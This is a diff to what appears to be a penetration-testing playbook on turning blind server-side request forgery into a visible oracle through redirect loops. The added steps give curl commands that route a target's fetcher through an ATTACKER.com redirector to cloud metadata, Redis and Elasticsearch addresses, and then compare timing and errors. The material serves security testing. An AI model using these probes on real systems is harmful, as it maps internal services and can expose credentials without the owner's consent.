@@ -12,14 +12,31 @@ description: Upgrade blind SSRF to visible using HTTP redirect loops and error d
 - Need to prove impact beyond "blind" (e.g. reach metadata services)
 
 ## Probe
-1. Set up two attacker-controlled URLs that redirect to each other: `A -> B -> A` (infinite loop)
-2. Submit URL A as SSRF payload — server follows until redirect limit (20-30 hops)
-3. Observe: response time increases proportionally to redirect depth followed
-4. Now vary the chain: `A -> internal_target -> B -> A`
-5. Differential analysis: different internal targets produce different error types
-   - `169.254.169.254` → connection timeout vs auth error (reveals metadata service exists)
-   - Internal host → `NetworkException` vs `JSONParseException` (reveals service type)
-6. Error message content, timing, and HTTP status code all serve as oracle channels
+
+### 1. Confirm redirect following
+```bash
+# Set up redirect loop server (minimal Flask):
+# @app.route('/a') -> redirect('/b'), @app.route('/b') -> redirect('/a')
+# Submit loop URL as SSRF payload and measure timing
+time curl -s "https://target.com/fetch?url=https://ATTACKER.com/a" -o /dev/null
+# Compare with non-redirect URL timing as baseline
+time curl -s "https://target.com/fetch?url=https://ATTACKER.com/static" -o /dev/null
+```
+
+**Checkpoint:** If response time does NOT increase with the redirect loop, the server may not follow redirects. Try 301/302/307/308 variants. If none work, this technique is not applicable.
+
+### 2. Differential analysis
+```bash
+# Inject internal target mid-chain: A -> internal_target -> B -> A
+# Compare responses for different internal targets:
+curl -s "https://target.com/fetch?url=https://ATTACKER.com/redir?to=http://169.254.169.254/latest/meta-data/"
+curl -s "https://target.com/fetch?url=https://ATTACKER.com/redir?to=http://10.0.0.1:6379/"
+curl -s "https://target.com/fetch?url=https://ATTACKER.com/redir?to=http://localhost:9200/"
+```
+
+Different internal targets produce different error types, timing, or status codes — each serves as an oracle channel:
+- `169.254.169.254` → connection timeout vs auth error (reveals metadata service exists)
+- Internal host → `NetworkException` vs `JSONParseException` (reveals service type)
 
 ## Indicators
 - Response time scales with redirect chain depth (confirms redirect following)
